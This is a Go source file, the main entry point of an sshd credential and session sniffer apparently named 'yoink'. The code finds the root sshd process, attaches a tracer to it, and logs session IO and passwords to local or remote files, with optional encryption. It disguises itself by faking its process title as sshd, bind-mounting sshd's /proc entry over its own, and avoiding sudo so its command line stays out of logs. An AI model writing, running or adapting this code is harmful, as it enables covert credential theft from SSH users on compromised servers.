package main

import (
	"flag"
	"fmt"
	"github.com/lunixbochs/ghostrace/ghost/process"
	"github.com/lunixbochs/gspt"
	"io"
	"log"
	"os"
	"os/exec"
	"strings"
)

var defaultTitle = "/usr/sbin/sshd -D"

func main() {
	fs := flag.NewFlagSet("yoink", flag.ExitOnError)
	// logging options
	nullIO := fs.Bool("noio", false, "skip logging IO, still can log creds")
	logPath := fs.String("log", "",
		"set output log (disables stdout, will overwrite existing files)"+
			"\n\tcan be used over ssh via user@host:path/to/file || user:pass@host+port:path/to/file")
	credPath := fs.String("creds", "", "copy creds to separate log (will overwrite existing files)")
	key := fs.String("key", "", "encrypt logs with key (must be 32 hex bytes)")
	lzw := fs.Bool("lzw", false, "compress logs")

	// process setup
	title := fs.String("title", defaultTitle, "set process title")
	pid := fs.Int("sshd", 0, "force root sshd pid")
	mount := fs.Bool("mount", false, "mount --bind /proc/<sshd> /proc/<our pid>")

	// read logs
	dump := fs.Bool("dump", false, "dump/decode log file(s) (default title changes to `vi`")
	tail := fs.Bool("tail", false, "tail log file(s) (default title changes to `vi`)")

	fs.Parse(os.Args[1:])
	log.SetFlags(0)

	proc, _ := process.FindPid(os.Getpid())
	if proc != nil {
		parent := proc.Parent()
		if parent != nil {
			cmdline := parent.Cmdline()
			if len(cmdline) > 0 && strings.Contains(cmdline[0], "sudo") {
				log.Fatal("[-] cowardly refusing to leak command line via sudo")
			}
		}
	}

	if (*dump || *tail) && *title == defaultTitle {
		*title = "cat"
	}

	// this changes our title in `ps`
	gspt.SetProcTitle(*title)

	// bail early if we're dumping or tailing
	if *dump || *tail {
		logs, creds, err := openLogs(*logPath, *credPath, *key, *lzw)
		if err != nil {
			log.Fatalf("[-] failed to open logs: %s", err)
		}
		if *dump {
			dumpLogs(logs, creds)
			return
		}
		if *tail {
			tailLogs(logs, creds)
			return
		}
	}

	// set up logging
	var output io.WriteCloser = os.Stderr
	var credOut io.WriteCloser = &Discard{}
	var err error
	if *nullIO {
		output = &Discard{}
	}
	if *logPath != "" {
		output, err = openLog(*logPath)
		if err != nil {
			log.Fatalf("[-] failed to open log %#v: %s", *logPath, err)
		}
	}
	if *credPath != "" {
		credOut, err = os.OpenFile(*credPath, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
		if err != nil {
			log.Fatalf("[-] failed to open cred log %#v: %s", *credPath, err)
		}
	}
	if *lzw {
		if *logPath == "" {
			log.Println("[-] warning: -lzw requires -log")
		} else {
			output = compressStream(output)
		}
	}
	if *key != "" {
		if *logPath == "" && *credPath == "" {
			log.Println("[-] warning: -key requires -log or -creds")
		} else {
			if output != os.Stderr {
				output, err = encryptStream(output, *key)
				if err != nil {
					log.Fatalf("[-] encryption init failed: %s", err)
				}
			}
			if credOut != nil {
				credOut, err = encryptStream(credOut, *key)
				if err != nil {
					log.Fatalf("[-] encryption init failed (-creds): %s", err)
				}
			}
		}
	}
	logger := log.New(output, "", 0)
	credLogger := log.New(credOut, "", log.LstdFlags)

	// find sshd
	sshd := 0
	if *pid > 0 {
		sshd = *pid
	} else {
		parentSshd, err := process.Filter(func(p process.Process) bool {
			if isSshd(p) {
				return isSshd(p) && !isSshd(p.Parent())
			}
			return false
		})
		if err != nil {
			log.Fatalf("[-] error searching for sshd: %s", err)
		}
		if len(parentSshd) != 1 {
			log.Fatalf("[-] need (1) root sshd, found (%d)", len(parentSshd))
		}
		sshd = parentSshd[0].Pid()
	}

	// remount ourself in /proc
	if *mount {
		cmdArgs := []string{"mount", "--bind", fmt.Sprintf("/proc/%d", sshd), fmt.Sprintf("/proc/%d", os.Getpid())}
		if *logPath != "" {
			log.Printf("[+] %s", strings.Join(cmdArgs, " "))
		}
		logger.Printf("[+] %s", strings.Join(cmdArgs, " "))
		cmd := exec.Command(cmdArgs[0], cmdArgs[1:]...)
		if out, err := cmd.CombinedOutput(); err != nil {
			log.Printf("[-] mount failed: %s", err)
			log.Fatalf("[-] output: %s", string(out))
		}
	}

	// let's go!
	if *logPath != "" {
		log.Printf("[+] started with pid [%d]", os.Getpid())
	}
	logger.Printf("[+] started with pid [%d]", os.Getpid())
	logger.Printf("[+] attaching to root sshd at [%d]", sshd)

	// trace our process
	if err := trace(sshd, logger, credLogger); err != nil {
		logger.Printf("[-] error during trace: %s", err)
	}
	// unmount
	if *mount {
		cmdArgs := []string{"umount", fmt.Sprintf("/proc/%d", os.Getpid())}
		logger.Printf("[+] %s", strings.Join(cmdArgs, " "))
		if *logPath != "" {
			log.Printf("[+] %s", strings.Join(cmdArgs, " "))
		}
		cmd := exec.Command(cmdArgs[0], cmdArgs[1:]...)
		if out, err := cmd.CombinedOutput(); err != nil {
			logger.Printf("[-] unmount failed: %s", err)
			logger.Printf("[-] output: %s", string(out))
		}
	}
	output.Close()
	credOut.Close()

}
